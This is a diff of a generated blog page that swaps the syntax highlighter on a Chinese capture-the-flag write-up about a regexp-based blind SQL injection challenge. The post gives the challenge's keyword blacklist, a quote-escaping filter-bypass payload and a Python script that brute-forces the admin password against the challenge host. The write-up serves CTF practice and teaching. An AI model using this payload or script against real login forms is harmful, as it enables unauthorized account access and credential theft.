@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      223 字
+      199 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      7
        分钟
     </span>
   
@@ -240,42 +248,42 @@
             <div class="markdown-body">
               <h2 id=""><a href="#" class="headerlink" title=".`."></a>.`.</h2><p><img src="https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg" srcset="/img/loading.gif" alt="01.png">      </p>
 <p><code>robots.txt</code>     </p>
-<div class="hljs"><pre><code>User-agent: *
-Disallow: /hint.txt      </code></pre></div>
+<pre><code>User-agent: *
+Disallow: /hint.txt      </code></pre>
 <p><code>hint.txt</code>      </p>
-<div class="hljs"><pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
+<pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
 
 
 If $_POST[&#39;passwd&#39;] === admin&#39;s password,
 
-Then you will get the flag;     </code></pre></div>
+Then you will get the flag;     </code></pre>
 <p>regexp正则注入<br><code>regexp</code>函数，匹配字符      </p>
 <p><img src="https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg" srcset="/img/loading.gif" alt="02.png">         </p>
 <p>单引号被过        </p>
 <p>用<code>\</code>转义username的单引号，passwd后接<code>||</code>(或)         </p>
 <p>payload:<code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> string
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
 
-passwd = <span class="hljs-string">&#x27;&#x27;</span>
-string= string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;_&#x27;</span>    <span class="hljs-comment">#小写字母加数字加_</span>
-url = <span class="hljs-string">&#x27;http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php&#x27;</span>
+passwd <span class="token operator">=</span> <span class="token string">''</span>
+string<span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>    <span class="token comment">#小写字母加数字加_</span>
+url <span class="token operator">=</span> <span class="token string">'http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php'</span>
 
-<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
-    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:
-        data = &#123;
-            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,
-            <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>((passwd+m),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))       <span class="hljs-comment">##parse.unquote进行url解码，不解码直接弄不行</span>
-        &#125;
-        res = requests.post(url,data=data)
-        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">in</span> res.text:
-            passwd += m
-            print(m)
-            <span class="hljs-keyword">break</span>
-    <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:
-        <span class="hljs-keyword">break</span>
-print(passwd)</code></pre></div></code></pre>
+<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> m <span class="token keyword">in</span> string<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span>
+            <span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"||/**/passwd/**/regexp/**/\"^&#123;&#125;\";&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">##parse.unquote进行url解码，不解码直接弄不行</span>
+        <span class="token punctuation">&#125;</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            passwd <span class="token operator">+=</span> m
+            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> m<span class="token operator">==</span><span class="token string">'_'</span> <span class="token keyword">and</span> <span class="token string">'welcome'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span></code></pre></code></pre>
 <p><img src="https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg" srcset="/img/loading.gif" alt="03.png"></p>
 
             </div>
@@ -421,6 +429,8 @@ print(passwd)</code></pre></div></code></pre>
 
 
 
+  
+    
   
 
 
